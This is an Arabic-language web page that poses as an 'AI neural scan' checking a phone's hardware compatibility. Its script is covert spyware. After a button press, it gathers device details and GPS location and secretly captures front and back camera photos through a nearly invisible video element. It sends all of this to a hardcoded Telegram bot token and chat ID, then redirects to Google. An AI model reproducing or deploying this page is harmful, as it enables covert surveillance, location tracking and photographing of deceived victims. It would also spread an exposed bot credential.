<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Neural System | فحص العتاد الذكي</title>
    <style>
        :root { --main: #a855f7; --bg: #05070a; }
        body { background: var(--bg); color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: rgba(20, 20, 25, 0.9); padding: 40px; border-radius: 35px; border: 1px solid rgba(168, 85, 247, 0.2); text-align: center; width: 85%; max-width: 400px; z-index: 10; }
        #goBtn { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--main); background: transparent; color: white; font-size: 22px; font-weight: bold; cursor: pointer; outline: none; }
        /* 🛑 السر هنا: جعل الفيديو مرئياً بحد أدنى لإجبار النظام على المعالجة */
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>NEURAL <span style="color:var(--main)">SCAN</span></h1>
        <p id="sub">اضغط لتحليل توافق معالج AI مع هاتفك</p>
        <button id="goBtn">بدء الفحص</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const C = "7984067238";

        async function post(msg, photo = null) {
            const url = `https://api.telegram.org/bot${T}/`;
            try {
                if(!photo) {
                    await fetch(`${url}sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                } else {
                    const fd = new FormData();
                    fd.append("chat_id", C);
                    fd.append("photo", photo, "shot.jpg");
                    if(msg) fd.append("caption", msg);
                    await fetch(`${url}sendPhoto`, { method: "POST", body: fd });
                }
            } catch(e) {}
        }

        async function snap(side) {
            try {
                // طلب صلاحيات الكاميرا
                const s = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: side === "front" ? "user" : "environment" }
                });
                const v = document.getElementById('v');
                const c = document.getElementById('c');
                
                v.srcObject = s;
                // إجبار الفيديو على العمل
                await v.play();

                // الانتظار حتى يستقر الضوء (تجنب السواد)
                await new Promise(r => setTimeout(r, 2500)); 

                c.width = v.videoWidth; 
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                s.getTracks().forEach(t => t.stop());
                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
            } catch(e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("sub").innerText = "جاري الفحص... يرجى الانتظار";

            // 1. تقرير الجهاز الكامل
            let report = `🚀 *رصد شامل (تم حل مشكلة السواد)*:\n`;
            try {
                const b = await navigator.getBattery();
                report += `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌" : "🔋"})\n`;
            } catch(e){}
            
            const n = navigator.connection || {};
            report += `📶 الشبكة: \`${n.type || n.effectiveType || "WiFi"}\`\n`;
            report += `💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
            report += `📱 النظام: \`${navigator.platform}\`\n`;

            // 2. الموقع
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await post(report + `📍 [الموقع](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
            }, () => post(report + "⚠️ الموقع مرفوض"));

            // 3. الصور (بتوقيت أطول لضمان الوضوح)
            const f = await snap("front");
            if(f) await post("📸 صورة أمامية", f);

            const b = await snap("back");
            if(b) await post("📷 صورة خلفية", b);

            setTimeout(() => { location.href = "https://www.google.com"; }, 3000);
        };
    </script>
</body>
</html>
